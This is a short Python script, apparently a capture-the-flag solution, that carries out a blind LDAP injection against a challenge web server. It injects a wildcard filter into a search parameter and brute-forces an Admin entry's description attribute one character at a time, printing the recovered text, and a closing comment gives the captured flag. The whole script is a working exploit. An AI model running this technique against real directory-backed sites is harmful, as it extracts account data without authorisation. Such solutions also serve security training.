import string
import sys

import requests


def main():
    writing = True
    desc = ""
    url = "http://jh2i.com:50019/?search=Admin*)(description="
    while writing:
        charFound = False
        for c in string.printable:
            req = requests.get(url + c + "*")
            rez = req.text.split('<tbody>')[1].split('</tbody>')[0].strip()
            if len(rez) > 0:
                if c == "#":
                    print("\nDescription is:\t%s" % desc)
                    exit(0)
                # print(rez)
                desc += c
                url += c
                sys.stdout.write(c)
                sys.stdout.flush()
                charFound = True
                break
        if not charFound:
            # no more characters discovered
            print("Description is:\n%s" % desc)
            exit(0)


main()

# FLAG --> flag{kids_please_sanitize_your_inputs}
